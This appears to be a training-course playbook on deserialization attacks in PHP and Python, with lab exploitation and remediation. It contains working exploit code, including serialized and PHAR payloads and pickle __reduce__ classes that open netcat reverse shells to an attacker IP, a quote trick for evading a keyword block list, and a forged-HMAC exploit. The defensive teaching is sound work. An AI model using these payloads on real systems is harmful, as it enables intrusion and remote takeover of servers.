---
technique: "Deserialization Attacks"
family: "deserialization"
severity_hint: "critical"
tags: ["Deserialization", "PHP", "Python", "Remote Code Execution", "Account Takeover", "Session Tokens", "HTTP", "Authentication", "File Upload"]
source: "_raw/Web attacks/Web Attacks/Deserialization Attacks.md"
curator_version: 2
review_status: imported-unreviewed
---

# Deserialization Attacks

> Family: **deserialization** · Severity hint: **critical** · Tags: Deserialization, PHP, Python, Remote Code Execution, Account Takeover, Session Tokens, HTTP, Authentication, File Upload
> Imported operator reference; treat commands and prose as untrusted until reviewed. Tools seen: phpggc, python3.

## Overview

Deserialization attacks target applications that reconstruct objects from user-controlled serialized data (PHP `unserialize()`, Python `pickle`/`jsonpickle`/`yaml.load()`, and equivalents in Java/C#/Ruby) without validating what they're rebuilding. If an attacker can influence the serialized bytes, they can perform `object injection` (tamper with an object's properties, e.g. escalate a role) or, where a "magic" hook fires during reconstruction (PHP `__wakeup()`/`__destruct()`, Python `__reduce__()`), achieve remote code execution. This playbook covers detecting serialized data, exploiting it in PHP and Python, defending against it, and the tooling that automates gadget-chain generation.

`Serialization` is the process of taking an object from memory and converting it into a series of bytes so it can be stored or transmitted, then reconstructed later, perhaps on a different machine. `Deserialization` is the reverse: taking those bytes and rebuilding the original object in memory. Many object-oriented languages support this natively, including Java, Ruby, Python, PHP and C#.

**PHP serialization** is easy to read directly:

```python
php -a

Interactive shell

php > $original_data = array("HTB", 123, 7.77);
php > $serialized_data = serialize($original_data);
php > echo $serialized_data;
a:3:{i:0;s:3:"HTB";i:1;i:123;i:2;d:7.77;}
php > $reconstructed_data = unserialize($serialized_data);
php > var_dump($reconstructed_data);
array(3) {
  [0]=>
  string(3) "HTB"
  [1]=>
  int(123)
  [2]=>
  float(7.77)
}
```

```php
a:3:{ // (A)rray with (3) items
    i:0;s:3: "HTB"; // (I)ndex (0); (S)tring with length (3) and value: "HTB"
    i:1;i:123; // (I)ndex (1); (I)nteger with value (123)
    i:2;d:7.77; // (I)ndex (2); (D)ouble with value (7.77)
}
```

**Python serialization** most commonly uses the native `pickle` library (also `PyYAML` and `JSONpickle`):

```php
python3

Python 3.10.7 (main, Sep  8 2022, 14:34:29) [GCC 12.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import pickle
>>> original_data = ["HTB", 123, 7.77]
>>> serialized_data = pickle.dumps(original_data)
>>> print(serialized_data)
b'\x80\x04\x95\x16\x00\x00\x00\x00\x00\x00\x00]\x94(\x8c\x03HTB\x94K{G@\x1f\x14z\xe1G\xae\x14e.'
>>> reconstructed_data = pickle.loads(serialized_data)
>>> print(reconstructed_data)
['HTB', 123, 7.77]
```

A pickle is a program for a virtual "pickle machine" (PM): a stack + a memo (long-term memory of already-seen objects), executed opcode by opcode to rebuild an arbitrary object. Key opcodes seen in the wild: `PROTO` (protocol version), `FRAME` (payload length), `EMPTY_LIST`/`MARK`/`SHORT_BINUNICODE`/`BININT1`/`BINFLOAT` (push values), `MEMOIZE` (remember an object), `APPENDS` (extend a list from the mark), `STOP` (end of pickle). This opcode stream is exactly what makes `__reduce__`-based RCE possible in the Exploitation (Python) section below.

## Detection

### White-Box

With source access, grep for the deserialization sinks directly. Non-exhaustive list:

- `unserialize()` + magic methods (e.g. `__construct`) — PHP
- `pickle.loads()` — Python Pickle
- `jsonpickle.decode()` — Python JSONPickle
- `yaml.load()` — Python PyYAML / ruamel.yaml
- `readObject()` — Java
- `Deserialize()` — C# / .NET
- `Marshal.load()` — Ruby

```python
grep 'unserialize' -nr .

./app/Http/Controllers/HTController.php:123: Session::flash('ie-message', 'Exported user settings!');
```

### Black-Box

Without source access, serialized data still has distinct, recognizable byte/string signatures:

- `a:4:{i:0;s:4:"Test";i:1;s:4:"Data";i:2;a:1:{i:0;i:4;}i:3;s:7:"ACADEMY";}` — PHP
- `(lp0\nS'Test'\np1\naS'Data'\np2\na(lp3\nI4\naaS'ACADEMY'\np4\na.` — Pickle Protocol 0, default for Python 2.x
- Bytes starting `80 01` (hex), ending `.` — Pickle Protocol 1, Python 2.x
- Bytes starting `80 02` (hex), ending `.` — Pickle Protocol 2, Python 2.3+
- Bytes starting `80 03` (hex), ending `.` — Pickle Protocol 3, default for Python 3.0-3.7
- Bytes starting `80 04 95` (hex), ending `.` — Pickle Protocol 4, default for Python 3.8+
- Bytes starting `80 05 95` (hex), ending `.` — Pickle Protocol 5, Python 3.x
- `["Test", "Data", [4], "ACADEMY"]` — JSONPickle, Python 2.7 / 3.6+
- `Test\n- Data\n- - 4\n- ACADEMY\n` — PyYAML / ruamel.yaml, Python 3.6+
- Bytes starting `AC ED 00 05 73 72` (hex) or `rO0ABXNy` (Base64) — Java
- Bytes starting `00 01 00 00 00 ff ff ff ff` (hex) or `AAEAAAD/////` (Base64) — C# / .NET
- Bytes starting `04 08` (hex) — Ruby

[Freddy](https://portswigger.net/bappstore/ae1cce0c6d6c47528b4af35faebc3ab3) (a BurpSuite extension) automates detection and exploitation of Java/.NET serialization.

## Exploitation (PHP)

Vulnerable pattern — user data flows straight into `unserialize()`:

```php
public function handleSettingsIE(Request $request) {
    if (Auth::check()) {
        if (isset($request['export'])) {
            $user = Auth::user();
            $userSettings = new UserSettings($user->name, $user->email, $user->password, $user->profile_pic);
            $exportedSettings = base64_encode(serialize($userSettings));

            Session::flash('ie-message', 'Exported user settings!');
            Session::flash('ie-exported-settings', $exportedSettings);
        } 
        else if (isset($request['import']) && !empty($request['settings'])) {
            $userSettings = unserialize(base64_decode($request['settings']));
            $user = Auth::user();
            $user->name = $userSettings->getName();
            $user->email = $userSettings->getEmail();
            $user->password = $userSettings->getPassword();
            $user->profile_pic = $userSettings->getProfilePic();
            $user->save();
            
            Session::flash('ie-message', "Imported settings for '" . $userSettings->getName() . "'");
        }
        return back();
    }
    return redirect("/login")->withSuccess('You must be logged in to complete this action');
}
```

```php
<?php

namespace App\Helpers;

class UserSettings {
    private $Name;
    private $Email;
    private $Password;
    private $ProfilePic;

    public function getName() {
        return $this->Name;
    }

    public function getEmail() {
        return $this->Email;
    }

    public function getPassword() {
        return $this->Password;
    }

    public function getProfilePic() {
        return $this->ProfilePic;
    }

    public function setName($Name) {
        $this->Name = $Name;
    }

    public function setEmail($Email) {
        $this->Email = $Email;
    }

    public function setPassword($Password) {
        $this->Password = $Password;
    }

    public function setProfilePic($ProfilePic) {
        $this->ProfilePic = $ProfilePic;
    }

    public function __construct($Name, $Email, $Password, $ProfilePic) {
        $this->setName($Name);
        $this->setEmail($Email);
        $this->setPassword($Password);
        $this->setProfilePic($ProfilePic);
    }
...
```

To exploit this, create a local file with the same name/content as the class being serialized (`UserSettings.php`), then a small exploit script:

```php
<?php
include('UserSettings.php');

echo base64_encode(serialize(new \App\Helpers\UserSettings('pentest', 'attacker@htbank.com', '$2y$10$u5o6u2EbjOmobQjVtu87QO8ZwQsDd2zzoqjwS0.5zuPr3hqk9wfda', 'default.jpg')));
```

```bash
❯ php exploit.php
TzoyNDoiQXBwXEhlbHBlcnNcVXNlclNldHRpbm...
```

Serialized objects carry the fully-qualified class name, not the file — e.g. `O:26:"App\Helpers\UserSettings":4:{...}`.

### Testing Locally

Isolate the vulnerable function rather than standing up the whole app. Copy the target function (here `handleSettingsIE()`) into a standalone `target.php` that takes the payload as `argv[1]`:

```php
<?php

include('UserSettings.php');

// else if (isset($request['import']) && !empty($request['settings'])) {
//   $userSettings = unserialize(base64_decode($request['settings']));
$userSettings = unserialize(base64_decode($argv[1]));

//   $user = Auth::user();
//   $user->name = $userSettings->getName();
//   $user->email = $userSettings->getEmail();
//   $user->password = $userSettings->getPassword();
//   $user->profile_pic = $userSettings->getProfilePic();
//   $user->save();    
print("\n");
print('$user->name = ' . $userSettings->getName() . "\n");
print('$user->email = ' . $userSettings->getEmail() . "\n");
print('$user->password = ' . $userSettings->getPassword() . "\n");
print('$user->profile_pic = ' . $userSettings->getProfilePic() . "\n");
print("\n");

//   Session::flash('ie-message', "Imported settings for '" . $userSettings->getName() . "'");
print('ie-message => Imported settings for \'' . $userSettings->getName() . '\'');

// }
```

```php
❯ php target.php TzoyNDoiQXBwXEhlbHBlcnNcVXNlclNldHRpbmdzIjo0OntzOjMwOiIAQXBwXEhlbHBlcnNcVXNlclNldHRpbmdzAE5hbWUiO3M6NzoicGVudGVzdCI7czozMToiAEFwcFxIZWxwZXJzXFVzZXJTZXR0aW5ncwBFbWFpbCI7czoxOToiYXR0YWNrZXJAaHRiYW5rLmNvbSI7czozNDoiAEFwcFxIZWxwZXJzXFVzZXJTZXR0aW5ncwBQYXNzd29yZCI7czo2MDoiJDJ5JDEwJHU1bzZ1MkViak9tb2JRalZ0dTg3UU84WndRc0RkMnp6b3Fqd1MwLjV6dVByM2hxazl3ZmRhIjtzOjM2OiIAQXBwXEhlbHBlcnNcVXNlclNldHRpbmdzAFByb2ZpbGVQaWMiO3M6MTE6ImRlZmF1bHQuanBnIjt9

$user->name = pentest
$user->email = attacker@htbank.com
$user->password = $2y$10$u5o6u2EbjOmobQjVtu87QO8ZwQsDd2zzoqjwS0.5zuPr3hqk9wfda
$user->profile_pic = default.jpg

ie-message => Imported settings for 'pentest'
```

### RCE: Magic Methods

[Magic methods](https://www.php.net/manual/en/language.oop5.magic.php) override default PHP behavior when invoked on an object:

| __construct | Define a constructor for a class. Called when a new instance is created. E.g. `new Class()` |
| --- | --- |
| __toString | Define how an object reacts when treated as a string. E.g. `echo $obj` |
| __call | Called when you try to call inaccessible methods in an **object** context E.g. `$obj->doesntExist()` |
| __get | Called when you try to read inaccessible properties E.g. `$obj->doesntExist` |
| __set | Called when you try to write inaccessible properties E.g.  `$obj->doesntExist = 1` |
| __clone | Called when you try to clone an object E.g. `$copy = clone $object` |
| __destruct | Called when an object is destroyed (Opposite of constructor) |
| __isset | Called when you try to call `isset()` or `isempty()` on inaccessible properties E.g. `isset($obj->doesntExist)` |
| __invoke | Called when you try to invoke an object as a function, e.g. `$obj()` |
| __sleep | Called when serializing an object. If __serialize and __sleep are defined, the latter is ignored. E.g. `serialize($obj)` |
| __wakeup | Called when deserializing an object. If __unserialize and __wakeup are defined, the latter is ignored. E.g. `unserialize($ser_obj)` |
| __unset | Called when you try to unset inaccessible properties E.g. `unset($obj->doesntExist)` |
| __callStatic | Called when you try to call inaccessible methods in a **static** context E.g.  `Class::doesntExist()` |
| __set_state | Called when `var_export` is called on an object E.g. `var_export($obj, true)` |
| __debuginfo | Called when `var_dump` is called on an object E.g. `var_dump($obj)` |
| __unserialize | Called when deserializing an object. If __unserialize and __wakeup are defined, __unserialize is used. Only in PHP 7.4+. E.g.  `unserialize($obj)` |
| __serialize | Called when serializing an object. If __serialize and __sleep are defined, __serialize is used. Only in PHP 7.4+. E.g.  `unserialize($obj)` |

```php
...
    public function __construct($Name, $Email, $Password, $ProfilePic) {
        $this->setName($Name);
        $this->setEmail($Email);
        $this->setPassword($Password);
        $this->setProfilePic($ProfilePic);
    }

    public function __wakeup() {
        shell_exec('echo "$(date +\'[%d.%m.%Y %H:%M:%S]\') Imported settings for user \'' . $this->getName() . '\'" >> /tmp/htbank.log');
    }

    public function __sleep() {
        return array("Name", "Email", "Password", "ProfilePic");
    }
}
```

`__wakeup` appends a line to `/tmp/htbank.log` on every deserialize, using `shell_exec` with an attacker-controlled variable (`$this->getName()`) and no filtering — a straightforward command injection. Setting the name to begin with `";` breaks out of the `echo` and runs an arbitrary command:

```php
...
echo base64_encode(serialize(new \App\Helpers\UserSettings('"; nc -nv <ATTACKER_IP> 9999 -e /bin/bash;#', 'attacker@htbank.com', '$2y$10$u5o6u2EbjOmobQjVtu87QO8ZwQsDd2zzoqjwS0.5zuPr3hqk9wfda', 'default.jpg')));
...
```

```php
shell_exec('echo "... user \'' . $this->getName() . '\'" >> /tmp/htbank.log');
```

```php
' . $this->getName() . '
echo "' . '"; nc -nv <ATTACKER_IP> 9999 -e /bin/bash;# . '"
```

### RCE: Phar Deserialization

```php
...
if (!empty($request["profile_pic"])) {
  $file = $request->file('profile_pic');
  $fname = md5(random_bytes(20));
  $file->move('uploads',"$fname.jpg");
  $user->profile_pic = "uploads/$fname.jpg";
}
...
```

An arbitrary file upload can also lead to Phar deserialization. Per the [PHP docs](https://www.php.net/manual/en/intro.phar.php), PHAR packages a whole PHP application into an archive, accessed via `phar:///path/to/myphar.phar/file.php`. A PHAR archive's metadata can be any PHP variable that can be serialized, and — [until PHP 8.0](https://github.com/php/php-src/blob/PHP-8.0/ext/phar/phar.c#L1192) — PHP automatically deserializes that metadata any time a file operation touches a `phar://` path (even `file_exists`, `file_get_contents`):

```php
...
public function getImage(Request $request) {
  if (file_exists($request->query('_')))
    return redirect($request->query('_'));
  else
    return redirect("/default.jpg");
}
...
```

<aside>
⚠️

Note: Since PHP 8.0, this PHAR metadata is not deserialized by default. However, [55.1%](https://w3techs.com/technologies/details/pl-php/7) of websites still use PHP 7, so this remains a relevant attack.

</aside>

Given an arbitrary file upload (jpg extension is fine) and an endpoint that calls `file_exists`/`fopen`-family functions on an attacker-supplied path/protocol, build a PHAR whose metadata is the malicious payload:

```php
<?php
include('UserSettings.php');

$phar = new Phar("exploit.phar");
$phar->startBuffering();
$phar->addFromString('0', '');
$phar->setStub("<?php __HALT_COMPILER(); ?>");
$phar->setMetadata(new \App\Helpers\UserSettings('"; nc -nv <ATTACKER_IP> 9999 -e /bin/bash;#', 'attacker@htbank.com', '$2y$10$u5o6u2EbjOmobQjVtu87QO8ZwQsDd2zzoqjwS0.5zuPr3hqk9wfda', 'default.jpg'));
$phar->stopBuffering();
```

If archive creation is disabled:

```
PHP Fatal error:  Uncaught UnexpectedValueException: creating archive "exploit.phar" disabled by the php.ini setting phar.readonly in XXXXX
Stack trace:
#0 XXXXX: Phar->__construct()
#1 {main}
  thrown in XXXXX on line XX
```

fix it in `/etc/php/7.4/cli/php.ini`:

```php
[Phar]
; phar.readonly = On
phar.readonly = Off
```

```php
sudo sed -i 's/^;phar.readonly = On$/phar.readonly = Off/' /etc/php.ini
```

Upload the archive and trigger it via e.g. `http://SERVER_IP:8000/image?_=phar://uploads/MD5.jpg`. The server calls `file_exists('phar://uploads/MD5.jpg')` and the metadata gets deserialized.

## Exploitation (Python)

### Scenario

```php
echo gASVSgAAAAAAAACMCXV0aWwuYXV0aJSMB1Nlc3Npb26Uk5QpgZR9lCiMCHVzZXJuYW1llIwNZnJhbnoubXVlbGxlcpSMBHJvbGWUjAR1c2VylHViLg== | base64 -d | xxd

00000000: 8004 954a 0000 0000 0000 008c 0975 7469  ...J.........uti
00000010: 6c2e 6175 7468 948c 0753 6573 7369 6f6e  l.auth...Session
00000020: 9493 9429 8194 7d94 288c 0875 7365 726e  ...)..}.(..usern
00000030: 616d 6594 8c0d 6672 616e 7a2e 6d75 656c  ame...franz.muel
00000040: 6c65 7294 8c04 726f 6c65 948c 0475 7365  ler...role...use
00000050: 7294 7562 2e                             r.ub.
```

This looks like a serialized Python object. The corresponding code:

```php
...
@app.route("/login", methods = ['GET', 'POST'])
def login():
    if util.config.AUTH_COOKIE_NAME in request.cookies:
        return redirect("/")

    if request.method == 'POST':
        if util.auth.checkLogin(request.form['username'], request.form['password']):
            resp = make_response(redirect("/"))
            sess = util.auth.Session(request.form['username'])
            auth = util.auth.sessionToCookie(sess).decode()
            resp.set_cookie(util.config.AUTH_COOKIE_NAME, auth)
            return resp
    
    return render_template("login.html")
...
```

```php
...
class Session:
    def __init__(self, username):
        con = sqlite3.connect(config.DB_NAME)
        cur = con.cursor()
        res = cur.execute("SELECT username, role FROM users WHERE username = ?", (username,))
        self.username, self.role = res.fetchone()
        con.close()

    def getUsername(self):
        return self.username

    def getRole(self):
        return self.role

    def isAdmin(self):
        return self.role == 'admin'

def sessionToCookie(session):
    p = pickle.dumps(session)
    b = base64.b64encode(p)
    return b

def cookieToSession(cookie):
    b = base64.b64decode(cookie)
    for badword in [b"nc", b"ncat", b"/bash", b"/sh", b"subprocess", b"Popen"]:
        if badword in b:
            return None
    p = pickle.loads(b)
    return p
...
```

`cookieToSession` runs whenever a request carries the `auth_8bH3mjF6n9` cookie, e.g. hitting `/admin`:

```php
...
@app.route("/admin")
def admin():
    if util.config.AUTH_COOKIE_NAME in request.cookies:
        user = util.auth.cookieToSession(request.cookies.get(util.config.AUTH_COOKIE_NAME))
        return render_template("admin.html", user=user)

    return redirect("/login")
...
```

### Setting our Role

`isAdmin()` just checks `self.role == 'admin'`. Recreate the `Session` class locally with a constructor that accepts `role` directly, since only variable values matter once a class is pickled — methods are irrelevant:

```python
tree exploit/

exploit/
├── exploit-admin.py
└── util
    └── auth.py

1 directory, 2 files
```

```python
import pickle
import base64

class Session:
    def __init__(self, username, role):
        self.username = username
        self.role = role

def sessionToCookie(session):
    p = pickle.dumps(session)
    b = base64.b64encode(p)
    return b

def cookieToSession(cookie):
    b = base64.b64decode(cookie)
    for badword in [b"nc", b"ncat", b"/bash", b"/sh", b"subprocess", b"Popen"]:
        if badword in b:
            return None
    p = pickle.loads(b)
    return p
```

Instantiate a session with an arbitrary username and the admin role, then generate the cookie:

```python
import util.auth

s = util.auth.Session("attacker", "admin")
c = util.auth.sessionToCookie(s)
print(c.decode())
```

```bash
$python3 exploit-admin.py gASVRgAAAAAAAACMCXV...SNIP...b2xllIwFY..
```

### Testing Locally

```bash
python3Python 3.10.7 (main, Oct  1 2022, 04:31:04) [GCC 12.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import util.auth
>>> s = util.auth.cookieToSession('gASVRgAAAAAAAACMCXV...SNIP...b2xllIwFYWRtaW6UdWIu')
>>> s.username
'attacker'
>>> s.role
'admin'
```

### Remote Code Execution

The badword filter blocks obvious shell tokens:

```python
...
def cookieToSession(cookie):
    b = base64.b64decode(cookie)
    for badword in [b"nc", b"ncat", b"/bash", b"/sh", b"subprocess", b"popen"]:
        if badword in b:
            return None
    p = pickle.loads(b)
    return p
...
```

We control a value passed to `pickle.loads()`. Per the [pickle docs](https://docs.python.org/3/library/pickle.html#object.__reduce__), `object.__reduce__()` returns a callable plus a tuple of arguments used to restore the object on unpickling — so defining `__reduce__` to return `os.system` (or another callable not on the badword list) plus a command tuple gets code execution:

```python
import pickle
import base64
import os

class RCE:
    def __reduce__(self):
        return os.system, ("ping -c 5 <ATTACKER_IP>",)

r = RCE()
p = pickle.dumps(r)
b = base64.b64encode(p)
print(b.decode())
```

```python
python3

Python 3.10.7 (main, Oct  1 2022, 04:31:04) [GCC 12.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import util.auth
>>> s = util.auth.cookieToSession('gASVLgAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjBNwaW5nIC1jIDUgMTI3LjAuMC4xlIWUUpQu')
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.044 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.042 ms
64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.041 ms
64 bytes from 127.0.0.1: icmp_seq=4 ttl=64 time=0.041 ms
64 bytes from 127.0.0.1: icmp_seq=5 ttl=64 time=0.041 ms

--- 127.0.0.1 ping statistics ---
5 packets transmitted, 5 received, 0% packet loss, time 4076ms
rtt min/avg/max/mdev = 0.041/0.041/0.044/0.001 ms
```

### Running against the Target

To get a reverse shell (`nc -nv <ATTACKER_IP> 9999 -e /bin/sh` — banned words present), insert single quotes into the blacklisted words, e.g. `h'e'ad /e't'c/p'a's's'wd`:

```python
h'e'ad /e't'c/p'a's's'wd

root:x:0:0:root:/root:/usr/bin/zsh
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
```

```python
...
class RCE:
    def __reduce__(self):
        return os.system, ("n''c -nv 172.17.0.1 9999 -e /bin/s''h",)
...
```

This particular cookie causes an `Internal Server Error` (it's not a legitimate `util.auth.Session` object), but the command still runs before the error — fine for our purposes.

## Defense

### Introduction to HMACs

Ideally, never deserialize user-controlled data. If you must, one simple but effective mitigation is an [HMAC](https://www.rfc-editor.org/rfc/rfc2104) (Keyed-Hash Message Authentication Code): the server computes a checksum over the serialized payload using a secret key, appends it, and on the way back in recomputes the expected checksum before trusting (and deserializing) the payload.

### Patching HTBooks

Define a secret key in `util/config.py`:

```python
...
SECRET_KEY = "99308b5cf8de84fe5573a1a775406423"

```

Sign on the way out, verify before unpickling on the way in:

```python
...
import hmac
import hashlib
...
def sessionToCookie(session):
    # Create a pickled object and then calculate an HMAC using our secret key
    pickled = pickle.dumps(session)
    hmac_calculated = hmac.new(config.SECRET_KEY.encode(), pickled, hashlib.sha512).digest()

    # Concat the two parts together (base64-encoded) and use it as our cookie
    cookie = base64.b64encode(pickled) + b'.' + base64.b64encode(hmac_calculated)
    return cookie

def cookieToSession(cookie):
    # Split and decode the cookie into Pickle and HMAC
    pickled_b64, hmac_given_b64 = cookie.split(".")
    pickled = base64.b64decode(pickled_b64)
    hmac_given = base64.b64decode(hmac_given_b64)

    # Calculate the expected HMAC value and check if it matches
    hmac_expected = hmac.new(config.SECRET_KEY.encode(), pickled, hashlib.sha512).digest()
    if hmac_expected != hmac_given:
        return None

    # We have verified that this server created the cookie, and
    # can now unpickle the object safely
    unpickled = pickle.loads(pickled)
    return unpickled
...

```

Changing any byte of the pickled data or the HMAC now fails the authenticity check and the cookie is not deserialized. This does prevent the earlier attack — but note it's not bulletproof: if an attacker can separately read `util/auth.py` and `util/config.py` (e.g. via an arbitrary file read bug), they can still forge a valid HMAC and repeat the same attacks with one extra step. That's a hypothetical requiring a second vulnerability, not a flaw in HMACs themselves. Demonstrating that hypothetical: copy `util/config.py` into the exploit tree,

```bash
htb-student@htb[/htb]$ tree exploitexploit
├── exploit.py
└── util
    └── config.py

```

reuse the leaked `SECRET_KEY`,

```python
# HTBooks GmbH & Co. KG
# 10.10.2022

DB_NAME = "htbooks.sqlite3"
AUTH_COOKIE_NAME = "auth_8bH3mjF6n9"
SECRET_KEY = "99308b5cf8de84fe5573a1a775406423"

```

and extend the RCE exploit to also compute the matching HMAC:

```python
import pickle
import base64
import hashlib
import hmac
import os
import util.config

class RCE:
    def __reduce__(self):
        return os.system, ("nc -nv <ATTACKER_IP> 9999 -e /bin/sh",)

r = RCE()
p = pickle.dumps(r)
h = hmac.new(util.config.SECRET_KEY.encode(), p, hashlib.sha512).digest()
c = base64.b64encode(p) + b'.' + base64.b64encode(h)
print(c.decode())

```

```bash
htb-student@htb[/htb]$ python3 exploit.py gASVPAAAAAAAAACMBXBvc2l...SNIP...5IC1lIC9iaW4vc2iUhZRSlC4=.jlPg/hUsa4aLr0SpFq06Xya0i8IJzyh6ELt...SNIP...I5CyQa2yejlPNX5Tg==

```

```bash
htb-student@htb[/htb]$ nc -nvlp 9999Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::9999
Ncat: Listening on 0.0.0.0:9999
Ncat: Connection from 192.168.43.164.
Ncat: Connection from 192.168.43.164:37992.
ls -l
total 52
-rw-r--r-- 1 kali kali  2037 Oct 12 06:21 app.py
-rw-r--r-- 1 kali kali   184 Oct 12 06:17 Dockerfile
-rw-r--r-- 1 kali kali    15 Oct 12 06:18 flag.txt
-rw-r--r-- 1 kali kali 20480 Oct 12 08:02 htbooks.sqlite3
drwxr-xr-x 2 kali kali  4096 Oct 12 06:21 __pycache__
-rw-r--r-- 1 kali kali    27 Oct 12 06:17 requirements.txt
drwxr-xr-x 4 kali kali  4096 Oct 12 06:17 static
drwxr-xr-x 2 kali kali  4096 Oct 12 06:17 templates
drwxr-xr-x 3 kali kali  4096 Oct 12 06:21 util

```

### Avoiding Deserialization Vulnerabilities Altogether

The real fix is to stop calling a deserialization function on untrusted input in the first place — swap `unserialize`/`pickle.loads`/`yaml.load` for a safe data format (JSON, XML) with no code-execution semantics. Walking through updating `HTBank` (PHP) to JSON — note `HTBank` also has XSS, command injection, and arbitrary file upload issues that switching formats alone won't fix, so those need separate remediation:

- Delete `app/Helpers/UserSettings.php` — no longer needed once export/import work on plain arrays encoded as JSON.
- In `HTController.php`, replace serialize/unserialize with `json_encode`/`json_decode`, and replace the `shell_exec`-based logging with native PHP file-append calls:

```php
...
    public function handleSettingsIE(Request $request) {
        if (Auth::check()) {
            if (isset($request['export'])) {
                $user = Auth::user();

                // $userSettings = new UserSettings($user->name, $user->email, $user->password, $user->profile_pic);
                // $exportedSettings = base64_encode(serialize($userSettings));
                $userSettings = array("name" => $user->name, "email" => $user->email, "password" => $user->password, "profile_pic" => $user->profile_pic);
                $exportedSettings = base64_encode(json_encode($userSettings));

                // [UserSettings.__wakeup()]
                // shell_exec('echo "$(date +\'[%d.%m.%Y %H:%M:%S]\') Unserialized user \'' . $this->getName() . '\'" >> /tmp/htbank.log');
                $fp = fopen("/tmp/htbank.log", "a");
                fwrite($fp, date("[d.m.Y H:i:s]") . " Serialized user '" . $user->name . "'\n");
                fclose($fp);

                Session::flash('ie-message', 'Exported user settings!');
                Session::flash('ie-exported-settings', $exportedSettings);
            }
            else if (isset($request['import']) && !empty($request['settings'])) {
                // $userSettings = unserialize(base64_decode($request['settings']));
                // $user = Auth::user();
                // $user->name = $userSettings->getName();
                // $user->email = $userSettings->getEmail();
                // $user->password = $userSettings->getPassword();
                // $user->profile_pic = $userSettings->getProfilePic();
                // $user->save();
                $userSettings = json_decode(base64_decode($request['settings']));
                $user = Auth::user();
                $user->name = $userSettings->name;
                $user->email = $userSettings->email;
                $user->password = $userSettings->password;
                $user->profile_pic = $userSettings->profile_pic;
                $user->save();

                Session::flash('ie-message', "Imported settings for '" . $userSettings->name . "'");
            }
            return back();
        }
        return redirect("/login")->withSuccess('You must be logged in to complete this action');
    }
...

```

- Validate the upload is actually an image (blocks the PHAR trick from the Exploitation section):

```php
...
    if (!empty($request["profile_pic"])) {
        $request->validate(['profile_pic' => 'required|image']);
        $file = $request->file('profile_pic');
        $fname = md5(random_bytes(20));
        $file->move('uploads',"$fname.jpg");
        $user->profile_pic = "uploads/$fname.jpg";
    }
...

```

- Surface the validation error to the user in `settings.blade.php`:

```php
...
    <div class="form-group mb-3">
        <label for="ppic">Update profile picture (Only JPG)</label>
        <input type="file" class="form-control-file" id="ppic" name="profile_pic">
        @if ($errors->has('profile_pic'))
        <span class="text-danger">{{ $errors->first('profile_pic') }}</span>
        @endif
    </div>
...

```

- Upgrade to PHP ≥ 8.0 so PHAR metadata is no longer auto-deserialized by default.
- Fix the settings-page XSS by switching Blade output to `{{ ... }}` (escaped) instead of `{!! ... !!}` (raw):

```php
...
<p class="text-success">{{ Session::get('ie-message') }}</p>
...

```

With all of that in place, export now yields plain JSON instead of a serialized object:

```bash
htb-student@htb[/htb]$ echo eyJuYW1lIjoicGVudGVzdCIsImVtYWlsIjoicGVudGVzdEB0ZXN0LmNvbSIsInBhc3N3b3JkIjoiJDJ5JDEwJHU1bzZ1MkViak9tb2JRalZ0dTg3UU84WndRc0RkMnp6b3Fqd1MwLjV6dVByM2hxazl3ZmRhIiwicHJvZmlsZV9waWMiOiJ1cGxvYWRzXC83ZTRjMDkwZjdhMjBkMmI5YmVkYmE3ZGEwNTAyN2UzOS5qcGcifQ== | base64 -d{"name":"pentest","email":"pentest@test.com","password":"$2y$10$u5o6u2EbjOmobQjVtu87QO8ZwQsDd2zzoqjwS0.5zuPr3hqk9wfda","profile_pic":"uploads\/7e4c090f7a20d2b9bedba7da05027e39.jpg"}

```

and the old attack payloads (XSS, command injection) no longer fire:

```bash
htb-student@htb[/htb]$ tail /tmp/htbank.log [13.10.2022 12:35:15] Serialized user 'pentest'
[13.10.2022 12:35:55] Serialized user '<script>alert(1)</script>'
[13.10.2022 12:36:02] Unserialized user '<script>alert(1)</script>'
[13.10.2022 12:37:56] Serialized user 'pentest'
[13.10.2022 12:37:57] Unserialized user 'pentest'
[13.10.2022 12:38:08] Serialized user 'example'
[13.10.2022 12:38:10] Serialized user 'example'
[13.10.2022 12:38:11] Unserialized user 'example'
[13.10.2022 12:38:38] Serialized user '"; nc -nv 172.17.0.0.1 9999 -e /bin/bash; #'
[13.10.2022 12:38:41] Unserialized user '"; nc -nv 172.17.0.0.1 9999 -e /bin/bash; #'

```

A PHPGGC payload against this hardened version fails with a server error too (PHP tries to access `$userSettings->name` after decoding what is now a plain JSON object, not a `UserSettings` instance).

## Tools (PHP)

### PHPGGC

[phpggc](https://github.com/ambionics/phpggc) contains a collection of gadget chains built from vendor code in popular PHP frameworks, enabling file reads, writes, and RCE without hand-rolling a gadget chain:

```php
git clone https://github.com/ambionics/phpggc.git

phpggc -l Laravel

Gadget Chains
-------------

NAME             VERSION            TYPE                   VECTOR        I    
Laravel/RCE1     5.4.27             RCE (Function call)    __destruct         
Laravel/RCE10    5.6.0 <= 9.1.8+    RCE (Function call)    __toString         
Laravel/RCE2     5.4.0 <= 8.6.9+    RCE (Function call)    __destruct         
Laravel/RCE3     5.5.0 <= 5.8.35    RCE (Function call)    __destruct    *    
Laravel/RCE4     5.4.0 <= 8.6.9+    RCE (Function call)    __destruct         
Laravel/RCE5     5.8.30             RCE (PHP code)         __destruct    *    
Laravel/RCE6     5.5.* <= 5.8.35    RCE (PHP code)         __destruct    *    
Laravel/RCE7     ? <= 8.16.1        RCE (Function call)    __destruct    *    
